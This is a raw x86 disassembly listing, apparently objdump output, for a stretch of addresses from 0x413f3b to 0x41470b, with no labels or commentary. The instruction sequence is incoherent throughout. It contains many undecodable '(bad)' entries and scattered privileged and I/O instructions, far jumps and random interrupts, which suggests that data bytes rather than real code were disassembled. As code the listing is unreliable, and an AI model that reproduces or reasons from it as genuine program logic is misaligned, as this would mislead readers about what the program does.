  413f3b:	jge    0x413fa7
  413f3d:	std    
  413f3e:	loopne 0x413ec5
  413f40:	or     DWORD PTR [edx-0x7],ebx
  413f43:	xlat   BYTE PTR ds:[ebx]
  413f44:	mov    eax,ds:0x50d19646
  413f49:	xor    eax,0x7fe2d42e
  413f4e:	loop   0x413f0e
  413f50:	retf   0x3097
  413f53:	pop    edi
  413f54:	fs (bad) 
  413f56:	pusha  
  413f57:	jecxz  0x413f6b
  413f59:	pop    ebx
  413f5a:	mov    eax,0xbbeb3de4
  413f5f:	add    al,0xf
  413f61:	lock pusha 
  413f63:	adc    eax,0x3d1089e0
  413f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f69:	and    ecx,DWORD PTR [edi]
  413f6b:	dec    esp
  413f6c:	xchg   esp,eax
  413f6d:	popa   
  413f6e:	lods   eax,DWORD PTR ds:[esi]
  413f6f:	sub    eax,ebx
  413f71:	ret    0x6383
  413f74:	shl    BYTE PTR [eax+0xa60ba3a],cl
  413f7a:	xor    cl,BYTE PTR [ebx-0x64bdf8b7]
  413f80:	scas   al,BYTE PTR es:[edi]
  413f81:	aaa    
  413f82:	mov    edi,0xd1938924
  413f87:	ins    DWORD PTR es:[edi],dx
  413f88:	dec    ecx
  413f89:	push   edi
  413f8a:	jmp    0x4746:0x96034a97
  413f91:	fdiv   QWORD PTR [ecx+edx*8-0x44e1b5aa]
  413f98:	pop    esp
  413f99:	push   0xb4ec3228
  413f9e:	adc    al,0xb8
  413fa0:	xchg   edx,eax
  413fa1:	or     ebx,DWORD PTR [ebx+0x6c0089a4]
  413fa7:	sub    eax,0xe5921d8d
  413fac:	sbb    al,BYTE PTR [ebx]
  413fae:	jo     0x413f9c
  413fb0:	jne    0x413fec
  413fb2:	sbb    ah,ch
  413fb4:	jl     0x413fb7
  413fb6:	add    al,dh
  413fb8:	push   ecx
  413fb9:	and    ecx,DWORD PTR [esi]
  413fbb:	jb     0x413fff
  413fbd:	inc    ebx
  413fbe:	xor    bh,BYTE PTR [esi]
  413fc0:	mov    BYTE PTR [ecx+0x42bd5b2f],al
  413fc6:	lea    ebp,ds:0xce980293
  413fcc:	dec    edi
  413fcd:	aam    0xe4
  413fcf:	call   0x53607b56
  413fd4:	popa   
  413fd5:	cmp    bh,dl
  413fd7:	test   BYTE PTR [esi],ah
  413fd9:	jne    0x413ff4
  413fdb:	xlat   BYTE PTR ds:[ebx]
  413fdc:	pop    ebp
  413fdd:	scas   eax,DWORD PTR es:[edi]
  413fde:	mov    WORD PTR [ebx],ds
  413fe0:	jns    0x413ffc
  413fe2:	ins    BYTE PTR es:[edi],dx
  413fe3:	popf   
  413fe4:	xor    DWORD PTR [edi+edi*8+0x1faf9334],edi
  413feb:	xlat   BYTE PTR ds:[ebx]
  413fec:	hlt    
  413fed:	dec    esp
  413fee:	jle    0x413f7e
  413ff0:	dec    BYTE PTR [esp+eiz*4]
  413ff3:	aad    0x62
  413ff5:	or     al,0x5
  413ff7:	mov    eax,0x4b702583
  413ffc:	mov    DWORD PTR [ecx],esp
  413ffe:	sub    eax,0x2055a4a6
  414003:	inc    esp
  414004:	sub    eax,0x546e3802
  414009:	repnz loope 0x414004
  41400c:	call   0xda60bbad
  414011:	push   0xffffff85
  414013:	push   ebp
  414014:	fbstp  TBYTE PTR [ecx+0x28e85ac]
  41401a:	push   eax
  41401b:	fld    QWORD PTR [ecx]
  41401d:	cwde   
  41401e:	shl    BYTE PTR [eax+0x1b3f25f3],cl
  414024:	mov    BYTE PTR [ecx],dh
  414026:	sysexit 
  414028:	out    0xa1,al
  41402a:	sub    eax,0x161cf571
  41402f:	retf   0x1a28
  414032:	pop    ecx
  414033:	int    0x78
  414035:	sbb    edx,ebp
  414037:	mov    dh,0x96
  414039:	dec    ecx
  41403a:	loope  0x413ffc
  41403c:	paddusw mm2,mm6
  41403f:	push   ebx
  414040:	cmp    al,0xad
  414042:	fdiv   QWORD PTR [ebp+eiz*4-0x62]
  414046:	adc    DWORD PTR [ebx-0x39],ebx
  414049:	call   0x333d:0xa3d7f560
  414050:	mov    esp,0xc353626a
  414055:	je     0x413fdf
  414057:	inc    edx
  414058:	aas    
  414059:	and    BYTE PTR [eax+0xf],0x26
  41405d:	add    bl,BYTE PTR [eax-0x4a01dbd5]
  414063:	fld    QWORD PTR [ecx]
  414065:	gs pop ds
  414067:	iret   
  414068:	jbe    0x414024
  41406a:	xlat   BYTE PTR ds:[ebx]
  41406b:	in     eax,0xc
  41406d:	popa   
  41406e:	outs   dx,BYTE PTR ds:[esi]
  41406f:	aam    0xa1
  414071:	or     BYTE PTR [edi],bh
  414073:	mov    edi,0xfefd80b0
  414078:	mov    eax,DWORD PTR [ecx+0x4f84ef63]
  41407e:	sub    edi,DWORD PTR [edi-0x18]
  414081:	mov    edx,DWORD PTR [edi]
  414083:	aam    0x35
  414085:	push   edi
  414086:	ret    0x932e
  414089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41408a:	adc    esi,edi
  41408c:	jl     0x414107
  41408e:	arpl   WORD PTR [ebx],bx
  414090:	inc    edi
  414091:	mov    edi,0x85c235a5
  414096:	dec    ecx
  414097:	push   cs
  414098:	gs dec ebx
  41409a:	nop
  41409b:	xchg   ecx,eax
  41409c:	or     DWORD PTR [ebx+0x35e0a676],eax
  4140a2:	rcr    BYTE PTR [ecx+ecx*4],0xcf
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140a8:	adc    eax,DWORD PTR [edi+0x4b417ded]
  4140ae:	mov    ds:0xda85c893,al
  4140b3:	js     0x414041
  4140b5:	arpl   WORD PTR [esi-0x3b4870d3],di
  4140bb:	inc    ecx
  4140bc:	sti    
  4140bd:	and    bh,dh
  4140bf:	stos   DWORD PTR es:[edi],eax
  4140c0:	mov    DWORD PTR [eax+0xcc4fd9],esp
  4140c6:	jb     0x414129
  4140c8:	dec    edx
  4140c9:	inc    edx
  4140ca:	inc    esp
  4140cb:	jae    0x4140ea
  4140cd:	ret    
  4140ce:	jmp    0x683d:0x60ea6c65
  4140d5:	cmp    edi,esi
  4140d7:	sub    esi,esi
  4140d9:	int    0x55
  4140db:	pop    ss
  4140dc:	push   eax
  4140dd:	add    DWORD PTR [ebp+edx*8-0x21bf4580],edx
  4140e4:	sbb    DWORD PTR [esi+0x4b],ebp
  4140e7:	cmp    eax,ebp
  4140e9:	std    
  4140ea:	arpl   WORD PTR [edx],si
  4140ec:	mov    WORD PTR [esi],gs
  4140ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140ef:	out    0xa3,al
  4140f1:	ret    
  4140f2:	sub    esi,DWORD PTR [ecx-0x45806e98]
  4140f8:	mov    esi,0xc9644f4e
  4140fd:	into   
  4140fe:	sbb    ch,ah
  414100:	es in  eax,dx
  414102:	pop    ds
  414103:	int    0xa7
  414105:	xchg   DWORD PTR ds:0x8e8cda15,ebp
  41410b:	aam    0x8
  41410d:	cwde   
  41410e:	retf   0x7624
  414111:	mov    ds:0xff8ba1f6,eax
  414116:	in     eax,dx
  414117:	jle    0x414099
  414119:	repnz repnz loope 0x41411d
  41411d:	dec    ebp
  41411e:	sbb    dl,ah
  414120:	shl    DWORD PTR [esi-0x53],cl
  414123:	mov    esi,0x5c891225
  414128:	lahf   
  414129:	dec    ebx
  41412a:	aad    0x39
  41412c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41412d:	pop    ss
  41412e:	xchg   esi,eax
  41412f:	xor    ecx,edi
  414131:	mov    gs,WORD PTR [edi]
  414133:	xchg   edi,eax
  414134:	js     0x414167
  414136:	add    BYTE PTR [eax-0x2a6292c6],bl
  41413c:	call   FWORD PTR [esi]
  41413e:	and    edi,DWORD PTR [ebp+eax*1+0x26d56094]
  414145:	in     eax,0x48
  414147:	jo     0x4141ae
  414149:	push   ds
  41414a:	xchg   esi,eax
  41414b:	int    0xad
  41414d:	add    eax,0x3b5009c0
  414152:	adc    al,0x67
  414154:	sbb    al,0xd9
  414156:	pop    ds
  414157:	push   ebx
  414158:	call   FWORD PTR [edi+0x3592d521]
  41415e:	pop    edi
  41415f:	int3   
  414160:	push   0x2
  414162:	mov    al,ds:0xef2e9afc
  414167:	pushf  
  414168:	sbb    cl,dh
  41416a:	pop    ds
  41416b:	(bad)  [ebp+0x54]
  41416e:	rol    esp,1
  414170:	mov    sp,0xd5dc
  414174:	dec    esi
  414175:	sub    ebp,DWORD PTR [edi+0x61]
  414178:	xor    al,BYTE PTR [edi+0x3586afbb]
  41417e:	mov    ds:0x9fb591ad,eax
  414183:	sbb    eax,0xffffffae
  414186:	pop    es
  414187:	aam    0xee
  414189:	retf   0xb96
  41418c:	rcl    BYTE PTR [ebx],1
  41418e:	push   0xee7f89e8
  414193:	pop    ebx
  414194:	sub    esp,DWORD PTR [esi+0xac8ce40]
  41419a:	push   ebx
  41419b:	icebp  
  41419c:	xchg   ecx,eax
  41419d:	adc    DWORD PTR [esi],ecx
  41419f:	sbb    dl,BYTE PTR [esi]
  4141a1:	(bad)  
  4141a2:	push   esi
  4141a3:	aam    0x48
  4141a5:	add    DWORD PTR [ecx+0x5f],eax
  4141a8:	inc    edx
  4141a9:	in     eax,0x62
  4141ab:	std    
  4141ac:	mov    BYTE PTR [eax+0x42],dl
  4141af:	int    0x9c
  4141b1:	cwde   
  4141b2:	sub    BYTE PTR ds:0xb5d4146f,cl
  4141b8:	(bad)  
  4141ba:	xor    BYTE PTR [ecx+edx*2-0x5c],dh
  4141be:	jno    0x4141b8
  4141c0:	(bad)  
  4141c1:	jno    0x4141a8
  4141c3:	lock (bad) 
  4141c5:	mov    bl,0xea
  4141c7:	jne    0x4141dc
  4141c9:	mov    edx,0x28c85d1
  4141ce:	push   esi
  4141cf:	mov    edi,0x9aaeb6c0
  4141d4:	je     0x414232
  4141d6:	pop    ds
  4141d7:	jnp    0x414222
  4141d9:	xchg   DWORD PTR [eax-0x37a5e115],edi
  4141df:	rcl    DWORD PTR [esi+0x71],cl
  4141e2:	jmp    0x7374:0x8114eab2
  4141e9:	retf   
  4141ea:	(bad)  
  4141eb:	sti    
  4141ec:	mov    DWORD PTR [ebx+0x7d751ac4],edi
  4141f2:	sub    al,0xc
  4141f4:	mov    ah,0x2
  4141f6:	cli    
  4141f7:	mov    esp,edx
  4141f9:	cld    
  4141fa:	sub    eax,0x60fc01b9
  4141ff:	jno    0x41418a
  414201:	pusha  
  414202:	mov    ebx,0x239982e
  414207:	mov    DWORD PTR [esp+esi*2],ebp
  41420a:	jno    0x414268
  41420c:	mov    al,0x29
  41420e:	repnz mov eax,0x395fb528
  414214:	das    
  414215:	(bad)  
  414216:	mov    ch,0xfc
  414218:	sbb    BYTE PTR [ebp+esi*4+0x4a17c5d4],dl
  41421f:	sahf   
  414220:	add    eax,0xbe43bf1d
  414225:	dec    eax
  414226:	scas   al,BYTE PTR es:[edi]
  414227:	shr    DWORD PTR [edx+0x70d430c2],cl
  41422d:	int    0xf5
  41422f:	cmc    
  414230:	jb     0x4142aa
  414232:	ror    DWORD PTR [edx-0x75],0x7d
  414236:	fdivr  QWORD PTR [ebx-0x7b]
  414239:	test   eax,0x3510ffd2
  41423e:	sar    DWORD PTR es:[eax+0x4b8c16bb],1
  414245:	inc    edi
  414246:	pop    edi
  414247:	adc    al,0x7b
  414249:	aaa    
  41424a:	or     al,0xb6
  41424c:	mov    BYTE PTR [ebx-0x46cbdda2],ah
  414252:	inc    ebx
  414253:	dec    ebx
  414254:	rol    DWORD PTR [edx],cl
  414256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414257:	sbb    al,0x94
  414259:	push   eax
  41425a:	mov    cs,WORD PTR [edi+0x2e]
  41425d:	cwde   
  41425e:	pop    ds
  41425f:	adc    edx,DWORD PTR [esi-0xf869c51]
  414265:	xchg   ebp,eax
  414266:	ss aam 0x10
  414269:	cmp    cl,dl
  41426b:	push   ecx
  41426c:	test   DWORD PTR [eax-0x54777f07],0x1e183665
  414276:	popa   
  414277:	mov    cs,esi
  414279:	dec    edx
  41427a:	es in  al,dx
  41427c:	jecxz  0x414298
  41427e:	mov    WORD PTR [ecx+0x75110334],gs
  414284:	loopne 0x41426f
  414286:	ins    DWORD PTR es:[edi],dx
  414287:	rcl    DWORD PTR [esi+ecx*8],0xff
  41428b:	and    ecx,DWORD PTR [esi+0x66]
  41428e:	test   edi,eax
  414290:	jb     0x414216
  414292:	das    
  414293:	xchg   DWORD PTR [ebp+0x9b2dc48],ecx
  414299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41429a:	test   DWORD PTR [eax+ecx*8+0x18804228],esp
  4142a1:	cwde   
  4142a2:	pushf  
  4142a3:	xor    edi,DWORD PTR ds:0xf6196c02
  4142a9:	sub    DWORD PTR [ebx+0x39],ebx
  4142ac:	dec    ecx
  4142ad:	inc    ebp
  4142ae:	adc    BYTE PTR [esi+0x4d1f71b0],0xdb
  4142b5:	(bad)  
  4142b6:	mov    esi,0x1e769641
  4142bb:	jmp    FWORD PTR [ecx+0x59]
  4142be:	shl    DWORD PTR [eax-0x6e],1
  4142c1:	jl     0x4142f7
  4142c3:	aam    0x9e
  4142c5:	cwde   
  4142c6:	inc    edi
  4142c7:	pop    ecx
  4142c8:	popf   
  4142c9:	xor    bl,BYTE PTR [esi]
  4142cb:	mov    edx,0x188ae789
  4142d0:	cdq    
  4142d1:	mov    ebx,0x2638b4d7
  4142d6:	data16 out dx,al
  4142d8:	test   DWORD PTR [ecx-0x344e9f61],edi
  4142de:	cdq    
  4142df:	sbb    eax,0x9771bf88
  4142e4:	in     al,0xc5
  4142e6:	ret    
  4142e7:	mov    ds:0xc652033f,al
  4142ec:	leave  
  4142ed:	push   ecx
  4142ee:	outs   dx,DWORD PTR ds:[esi]
  4142ef:	and    al,bh
  4142f1:	daa    
  4142f2:	push   ds
  4142f3:	fbld   TBYTE PTR [ebp+0x68114193]
  4142f9:	cwde   
  4142fa:	(bad)  
  4142fc:	push   ax
  4142fe:	mov    esi,0x5326505a
  414303:	fiadd  WORD PTR [eax+0x2d]
  414306:	push   ds
  414307:	imul   esi,DWORD PTR [edi],0x34d93c4b
  41430d:	cmc    
  41430e:	push   0x67103ed5
  414313:	mul    BYTE PTR [eax+0x37]
  414316:	xchg   ebx,eax
  414317:	icebp  
  414318:	lds    ebp,FWORD PTR [ebx]
  41431a:	adc    bh,dl
  41431c:	mov    ch,ch
  41431e:	adc    dl,BYTE PTR [ebx-0x2b0fe6dc]
  414324:	adc    BYTE PTR [ebp+0x5a80a99e],ah
  41432a:	test   eax,0xc181899d
  41432f:	retf   
  414330:	xchg   BYTE PTR [ebx+ebp*8-0x6b],al
  414334:	rol    BYTE PTR ds:0x15e61d98,cl
  41433a:	fidivr WORD PTR [edx]
  41433c:	jno    0x4142d5
  41433e:	bound  ecx,QWORD PTR ds:0xfee7744b
  414344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414345:	jg     0x41431e
  414347:	and    al,0x3e
  414349:	add    esi,DWORD PTR [eax+ecx*8+0x669186af]
  414350:	xor    DWORD PTR [esi],esp
  414352:	push   ds
  414353:	or     DWORD PTR [esi+0x5],0x14ac94dd
  41435a:	je     0x414307
  41435c:	cmp    dh,BYTE PTR [eax+edx*2]
  41435f:	fst    DWORD PTR [ecx]
  414361:	ret    
  414362:	inc    edx
  414363:	pop    ecx
  414364:	ins    DWORD PTR es:[edi],dx
  414365:	push   ebx
  414366:	push   ds
  414367:	inc    ebp
  414368:	inc    esi
  414369:	in     eax,0x67
  41436b:	adc    BYTE PTR [eax+ecx*8-0x157d58a4],cl
  414372:	icebp  
  414373:	dec    edi
  414374:	mov    BYTE PTR [eax+0x6e],bh
  414377:	xor    al,0x27
  414379:	xchg   ebx,eax
  41437a:	pusha  
  41437b:	inc    edi
  41437c:	jae    0x41439e
  41437e:	mov    dh,0xea
  414380:	mov    dh,0x7b
  414382:	scas   al,BYTE PTR es:[edi]
  414383:	mov    dl,0x8c
  414385:	fcom   DWORD PTR [ecx]
  414387:	(bad)  
  414388:	call   0x5bde8983
  41438d:	cli    
  41438e:	fcmove st,st(4)
  414390:	(bad)  
  414391:	arpl   WORD PTR [ebx],di
  414393:	mov    bh,0xa6
  414395:	clc    
  414396:	mov    esp,0xcfbc8dcd
  41439b:	push   ebp
  41439c:	fstp   TBYTE PTR [esi]
  41439e:	mov    ebx,0x84029fcc
  4143a3:	ss mov ebp,0x301a7038
  4143a9:	push   ds
  4143aa:	push   ds
  4143ab:	sub    edx,DWORD PTR [edi-0x2926de6a]
  4143b1:	fdivr  QWORD PTR [esi]
  4143b3:	aam    0xc5
  4143b5:	aam    0x37
  4143b7:	rcr    BYTE PTR [eax],1
  4143b9:	pop    eax
  4143ba:	dec    ecx
  4143bb:	dec    edi
  4143bc:	(bad)  
  4143bd:	ffreep st(1)
  4143bf:	gs popa 
  4143c1:	lds    ecx,FWORD PTR [ebx+0x5712a015]
  4143c7:	(bad)
  4143ca:	push   0x58
  4143cc:	adc    bl,BYTE PTR [eax]
  4143ce:	mov    ds:0x6e90bc89,eax
  4143d3:	jae    0x4143d6
  4143d5:	inc    edx
  4143d6:	fimul  DWORD PTR ss:[ecx+0x4051550e]
  4143dd:	add    bl,BYTE PTR [edx+0x19]
  4143e0:	xchg   edi,eax
  4143e1:	mov    ecx,0xe02a8f53
  4143e6:	pop    ds
  4143e7:	or     eax,0x5c745ee1
  4143ec:	data16 mov BYTE PTR [edx-0x2c],dh
  4143f0:	retf   
  4143f1:	ss gs push esi
  4143f4:	adc    al,0x85
  4143f6:	(bad)  
  4143f7:	fdiv   DWORD PTR [edx-0x4a]
  4143fa:	pop    ds
  4143fb:	test   eax,0x5ff01cd3
  414400:	pop    ds
  414401:	and    al,0x27
  414403:	iret   
  414404:	and    BYTE PTR [edx],al
  414406:	or     al,0x71
  414408:	inc    esp
  414409:	push   esi
  41440a:	adc    ch,BYTE PTR [esi-0x29]
  41440d:	push   esi
  41440e:	pop    ds
  41440f:	xor    eax,0xfe8e8f65
  414414:	dec    esi
  414415:	pop    eax
  414416:	add    al,0xb2
  414418:	mov    BYTE PTR [ebx+0x358cd4c2],0x47
  41441f:	xor    al,0x68
  414421:	in     eax,0x1f
  414423:	loope  0x414438
  414425:	xchg   BYTE PTR [edi],ch
  414427:	mov    cl,0x46
  414429:	fdivr  st,st(1)
  41442b:	sahf   
  41442c:	push   ds
  41442d:	or     esi,DWORD PTR [ecx-0x2b]
  414430:	sub    edi,DWORD PTR [edx-0x1c863f9b]
  414436:	pop    ds
  414437:	fisttp WORD PTR [ebx-0x26]
  41443a:	sub    eax,0xcce07eca
  41443f:	aad    0x52
  414441:	push   0x5c
  414443:	test   bh,dl
  414445:	sbb    edi,esi
  414447:	and    ecx,DWORD PTR [eax-0x1bd4a275]
  41444d:	dec    ebx
  41444e:	push   ebx
  41444f:	out    dx,eax
  414450:	jg     0x4143de
  414452:	aaa    
  414453:	dec    ebp
  414454:	(bad)  
  414455:	fcom   QWORD PTR [edi]
  414457:	push   ebx
  414458:	push   edi
  414459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41445a:	iret   
  41445b:	xchg   edx,eax
  41445c:	or     edi,DWORD PTR [esi+0x6d]
  41445f:	popa   
  414460:	int    0xad
  414462:	mov    BYTE PTR [esi+0x672ac24e],ah
  414468:	out    dx,eax
  414469:	mov    ebx,0x45932559
  41446e:	pop    ecx
  41446f:	inc    ebp
  414470:	sti    
  414471:	lahf   
  414472:	lea    esi,[esi]
  414474:	push   ecx
  414475:	test   al,0x5f
  414477:	sahf   
  414478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414479:	cld    
  41447a:	or     al,0x8d
  41447c:	hlt    
  41447d:	fst    DWORD PTR [ebp+edx*8-0x17]
  414481:	shr    BYTE PTR [ecx+0x4399c8da],cl
  414487:	aam    0xa3
  414489:	lahf   
  41448a:	cmp    ebx,DWORD PTR [esi-0x35]
  41448d:	sub    cl,bh
  41448f:	xor    eax,0x8585d89
  414494:	mov    eax,ds:0x36940168
  414499:	add    cl,BYTE PTR [eax-0x49]
  41449c:	and    bh,BYTE PTR [eax-0x43]
  41449f:	ret    
  4144a0:	pop    edx
  4144a1:	fwait
  4144a2:	mov    eax,0x64752ae9
  4144a7:	pop    es
  4144a8:	rcr    cl,0x87
  4144ab:	data16 sbb al,0x10
  4144ae:	fmulp  st(3),st
  4144b0:	test   al,0x14
  4144b2:	lods   al,BYTE PTR ds:[esi]
  4144b3:	push   eax
  4144b4:	push   esp
  4144b5:	call   0x134999a5
  4144ba:	jp     0x4144f6
  4144bc:	lods   eax,DWORD PTR ds:[esi]
  4144bd:	rol    DWORD PTR [esi-0x4bfa6bfd],1
  4144c3:	adc    eax,0xf83e6b7f
  4144c8:	jp     0x414507
  4144ca:	lods   eax,DWORD PTR cs:[esi]
  4144cc:	and    al,BYTE PTR [edx]
  4144ce:	fsubr  st,st(1)
  4144d0:	pusha  
  4144d1:	into   
  4144d2:	scas   eax,DWORD PTR es:[edi]
  4144d3:	or     cl,BYTE PTR [eax+0x74b4265d]
  4144d9:	dec    edx
  4144da:	dec    edi
  4144db:	or     DWORD PTR [esi],edx
  4144dd:	add    edi,edx
  4144df:	cmp    eax,0x623c42ad
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	fwait
  4144e6:	pop    ds
  4144e7:	sub    eax,0x72681869
  4144ec:	(bad)  
  4144ed:	addr16 data16 aad 0x4
  4144f1:	jb     0x4144f4
  4144f3:	fbld   TBYTE PTR [ebp-0x76dde258]
  4144f9:	mov    ebx,0x41d238bc
  4144fe:	imul   ebx,DWORD PTR [ebx],0xffffffa8
  414501:	dec    edx
  414502:	pop    esi
  414503:	(bad)  
  414504:	xor    BYTE PTR [esi*2+0x1fbeecbd],cl
  41450b:	pop    edx
  41450c:	stos   BYTE PTR es:[edi],al
  41450d:	addr16 pop ds
  41450f:	outs   dx,BYTE PTR ds:[esi]
  414510:	mov    BYTE PTR [edi],bh
  414512:	sub    al,0x65
  414514:	not    BYTE PTR [ecx]
  414516:	std    
  414517:	push   ds
  414518:	ror    BYTE PTR [edx-0x26],cl
  41451b:	xor    ebx,DWORD PTR [ecx-0x40828769]
  414521:	arpl   WORD PTR [edx-0x79552b9a],sp
  414527:	mov    al,0xb6
  414529:	pop    ss
  41452a:	cmp    al,0x81
  41452c:	or     BYTE PTR [ecx+0x5c],bh
  41452f:	test   al,0xfd
  414531:	fadd   st,st(7)
  414533:	fsub   DWORD PTR [edi+eax*1-0x2962a6d]
  41453a:	push   eax
  41453b:	mov    esp,0x8f1b89e
  414540:	mov    cl,0x21
  414542:	pusha  
  414543:	lahf   
  414544:	(bad)  
  414545:	sbb    DWORD PTR [eax+0x6cf5e531],edi
  41454b:	push   ss
  41454c:	jle    0x414551
  41454e:	dec    esp
  41454f:	or     eax,0xbbbd343f
  414554:	xor    bh,BYTE PTR [esi]
  414556:	pop    ds
  414557:	(bad)  
  414558:	repnz gs push ds
  41455b:	push   edx
  41455c:	pop    esi
  41455d:	rcr    DWORD PTR [eax],cl
  41455f:	scas   eax,DWORD PTR es:[edi]
  414560:	test   eax,0xdf25aa5a
  414565:	add    BYTE PTR [edx-0x68],0x7f
  414569:	push   ebp
  41456a:	push   ds
  41456b:	or     edx,ebp
  41456d:	sbb    ecx,DWORD PTR [esi+edx*4-0x2a484f74]
  414574:	jns    0x414556
  414576:	loop   0x414530
  414578:	stos   DWORD PTR es:[edi],eax
  414579:	jb     0x4145a3
  41457b:	popa   
  41457c:	xchg   ebp,eax
  41457d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457e:	adc    eax,0xd6420d78
  414583:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414584:	push   eax
  414585:	adc    al,0x30
  414587:	xchg   ebp,eax
  414588:	and    ebp,DWORD PTR [ecx]
  41458a:	dec    eax
  41458b:	aad    0x39
  41458d:	fst    st(3)
  41458f:	xchg   ebx,eax
  414590:	mov    eax,ds:0x76c17bbe
  414595:	in     eax,0xc0
  414597:	adc    eax,0xde8f6486
  41459c:	daa    
  41459d:	add    ah,BYTE PTR [eax]
  41459f:	cld    
  4145a0:	outs   dx,DWORD PTR ds:[esi]
  4145a1:	aam    0x67
  4145a3:	daa    
  4145a4:	test   bl,ah
  4145a6:	pop    ds
  4145a7:	sub    ecx,DWORD PTR [ebp-0x31fdefde]
  4145ad:	add    BYTE PTR [esi+0x5cba4bd5],ah
  4145b3:	mov    DWORD PTR [ebx-0x22],eax
  4145b6:	ret    
  4145b7:	push   esp
  4145b8:	mov    BYTE PTR [ecx],cl
  4145ba:	add    al,0xda
  4145bc:	in     eax,dx
  4145bd:	rol    BYTE PTR [edx+eax*1+0x20],cl
  4145c1:	add    dh,BYTE PTR [esi]
  4145c3:	scas   al,BYTE PTR es:[edi]
  4145c4:	mov    ch,0xcb
  4145c6:	xchg   esi,eax
  4145c7:	push   es
  4145c8:	pop    es
  4145c9:	imul   ecx,DWORD PTR [esp+ebp*2],0xffffff89
  4145cd:	fucom  st(3)
  4145cf:	adc    al,0x18
  4145d1:	pop    ds
  4145d2:	inc    edi
  4145d3:	mov    ecx,esp
  4145d5:	add    bh,BYTE PTR [esi+esi*2]
  4145d8:	push   ebp
  4145d9:	in     al,dx
  4145da:	push   esp
  4145db:	test   al,0x7e
  4145dd:	arpl   WORD PTR [esi],bx
  4145df:	inc    edi
  4145e0:	addr16 daa 
  4145e2:	inc    eax
  4145e3:	add    al,0xa8
  4145e5:	mov    ah,0xfd
  4145e7:	aad    0x37
  4145e9:	ja     0x41459c
  4145eb:	sub    eax,DWORD PTR [ecx-0x76500710]
  4145f1:	or     eax,0x83ed584f
  4145f6:	popf   
  4145f7:	aas    
  4145f8:	call   0x2096cdff
  4145fd:	xor    al,0xd4
  4145ff:	cmp    DWORD PTR [edx+0x47796300],ebp
  414605:	ret    0x1f0d
  414608:	dec    ebx
  414609:	ret    0x470c
  41460c:	mov    ecx,0x56f76e05
  414611:	mov    ds:0xd9007f96,al
  414616:	sbb    al,0x38
  414618:	jg     0x4145a4
  41461a:	iretw  
  41461c:	dec    ecx
  41461d:	mov    ebx,0xa2bef21b
  414622:	mov    ah,0x62
  414624:	and    ecx,DWORD PTR [eax+0x6a88de9f]
  41462a:	cmp    bl,BYTE PTR [ecx-0x46037ea0]
  414630:	mov    DWORD PTR [ebp+0x2ea11d3d],ebp
  414636:	push   edi
  414637:	inc    edx
  414638:	push   esi
  414639:	add    bl,BYTE PTR [edx-0x1b6cf95a]
  41463f:	test   DWORD PTR [ebx+0x54390bee],edi
  414645:	ret    
  414646:	popa   
  414647:	cmp    DWORD PTR [eax+0x68f4c8c7],eax
  41464d:	fbstp  TBYTE PTR cs:[ecx-0x26]
  414651:	add    bl,BYTE PTR [esi+0x6d]
  414654:	xchg   BYTE PTR [edx-0x1417375c],cl
  41465a:	pusha  
  41465b:	jmp    0x41463d
  41465d:	sbb    eax,0x5c397252
  414663:	aad    0x7a
  414665:	dec    ebp
  414666:	pop    es
  414667:	lods   eax,DWORD PTR ds:[esi]
  414668:	or     si,bp
  41466b:	add    eax,0xdfd95b89
  414670:	(bad)  
  414671:	cmc    
  414672:	jge    0x41468b
  414674:	ret    0xcb25
  414677:	aam    0x5
  414679:	in     eax,0xf5
  41467b:	jo     0x41469a
  41467d:	cwde   
  41467e:	aam    0xd1
  414680:	mov    ch,ch
  414682:	ret    
  414683:	fistp  WORD PTR [esp+ebp*8-0x6a]
  414687:	jbe    0x414655
  414689:	add    al,dl
  41468b:	jp     0x414693
  41468d:	push   edx
  41468e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41468f:	(bad)  
  414690:	xchg   esp,eax
  414691:	fsub   DWORD PTR [eax+0x6f]
  414694:	mov    ah,BYTE PTR [eax-0x48]
  414697:	scas   eax,DWORD PTR es:[edi]
  414698:	pushf  
  414699:	(bad)  
  41469a:	cmp    edx,esp
  41469c:	push   cs
  41469d:	data16 mov WORD PTR [esi+esi*2],fs
  4146a1:	mov    ecx,0x3e706a05
  4146a6:	push   ds
  4146a7:	in     eax,0xab
  4146a9:	mov    ecx,0x141cff77
  4146ae:	and    ah,dl
  4146b0:	shr    ch,0xef
  4146b3:	jl     0x4146ad
  4146b5:	xchg   edi,eax
  4146b6:	sub    dl,BYTE PTR [edi-0x1cd86c77]
  4146bc:	sbb    dh,bh
  4146be:	in     al,dx
  4146bf:	sbb    BYTE PTR [edi],bl
  4146c1:	sbb    eax,0x508c79d8
  4146c6:	retf   0x696e
  4146c9:	inc    ebx
  4146ca:	xlat   BYTE PTR ds:[ebx]
  4146cb:	inc    ecx
  4146cc:	mov    ecx,0xd8e2fea5
  4146d1:	mov    BYTE PTR [eax-0x67],al
  4146d4:	sub    DWORD PTR [ebp+0x4e],0xd5a82a54
  4146db:	or     eax,0xa128d1f9
  4146e0:	mov    edi,edi
  4146e2:	pop    eax
  4146e3:	mov    BYTE PTR [ecx],ch
  4146e5:	xchg   ebp,eax
  4146e6:	jg     0x4146b5
  4146e8:	imul   edi,DWORD PTR [edi],0xcb5684
  4146ee:	push   0xa761e0b1
  4146f3:	in     eax,0xe1
  4146f5:	lods   al,BYTE PTR ds:[esi]
  4146f6:	jge    0x4146ed
  4146f8:	xlat   BYTE PTR ds:[ebx]
  4146f9:	sbb    BYTE PTR [ecx-0x3f552dab],ch
  4146ff:	cmp    DWORD PTR [esi+0x4b],esi
  414702:	push   0x22
  414704:	dec    esi
  414705:	enter  0x8caa,0x5f
  414709:	loope  0x41476b
  41470b:	xchg   ecx,eax
